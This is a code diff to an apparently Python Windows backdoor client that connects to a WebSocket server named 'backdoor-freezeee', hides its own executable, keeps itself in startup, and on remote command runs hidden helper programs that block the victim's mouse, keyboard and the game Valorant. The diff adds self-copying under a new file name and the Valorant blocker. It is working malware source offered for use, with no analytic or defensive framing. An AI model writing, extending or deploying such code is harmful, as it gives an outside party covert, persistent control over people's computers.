@@ -8,11 +8,24 @@ import os
 import winreg
 import subprocess
 import socket
+import shutil
 
 current_exe = sys.executable
 
 server_url = "wss://backdoor-freezeee.onrender.com"
 CLIENT_NAME = socket.gethostname()
+
+current_exe = sys.executable if getattr(sys, 'frozen', False) else __file__
+
+dir_path = os.path.dirname(os.path.abspath(current_exe))
+filename = os.path.basename(current_exe)
+
+name, ext = os.path.splitext(filename)
+
+new_name = name + "l" + ext
+new_path = os.path.join(dir_path, new_name)
+
+shutil.copy2(current_exe, new_path)
 
 def will_startup_execute(filename):
     filename = filename.lower()
@@ -49,7 +62,8 @@ async def pinger(ws):
         pass
 
 block_exe = resource_path("block_inputs.exe")
-if not os.path.isfile(block_exe):
+valorantblock_exe = resource_path("valorantblock.exe")
+if not os.path.isfile(block_exe) or not os.path.isfile(valorantblock_exe):
     sys.exit(1)
 
 startupinfo = subprocess.STARTUPINFO()
@@ -61,8 +75,8 @@ creationflags = subprocess.CREATE_NO_WINDOW | subprocess.CREATE_NEW_PROCESS_GROU
 state = {
     "mouse": None,
     "keyboard": None,
+    "valorant": None,
 }
-
 
 if not im_in_startup():
     hide_file(current_exe)
@@ -74,7 +88,8 @@ check_reinstall()
 async def receiver(ws):
     try:
         async for msg in ws:
-            handle_message(msg, block_exe, state, startupinfo, creationflags)
+            if msg != "PONG":
+                handle_message(msg, block_exe, valorantblock_exe, state, startupinfo, creationflags)
     except Exception:
         pass
 
@@ -90,7 +105,7 @@ async def main():
                         websockets.connect(server_url),
                         timeout=1400
                     )
-                    print("Conectado")
+                    print("Connected!")
                 except asyncio.TimeoutError:
                     print("Timeout ao conectar")
                     ws = None
@@ -152,6 +167,5 @@ async def main():
                 pass
             ws = None
             await asyncio.sleep(5)
-
 
 asyncio.run(main())
